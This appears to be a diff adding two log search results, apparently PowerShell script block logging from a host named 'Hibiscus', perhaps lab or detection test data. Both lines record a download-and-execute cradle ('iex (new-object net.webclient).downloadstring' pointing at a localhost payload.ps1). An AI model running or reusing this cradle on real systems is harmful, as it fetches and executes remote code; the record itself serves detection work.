@@ -1,0 +1,2 @@
+{"preview":false,"result":{"_time":"2025-11-03T22:41:44.462+0000","host":"Hibiscus","hit":"creating scriptblock text (1 of 1): iex (new-object net.webclient).downloadstring('http://127.0.0.1:8001/payload.ps1')  scrip"}}
+{"preview":false,"result":{"_time":"2025-11-03T22:41:44.373+0000","host":"Hibiscus","hit":" scriptblock text (1 of 1): powershell -noprofile -command \"iex (new-object net.webclient).downloadstring('http://127.0.0.1"}}
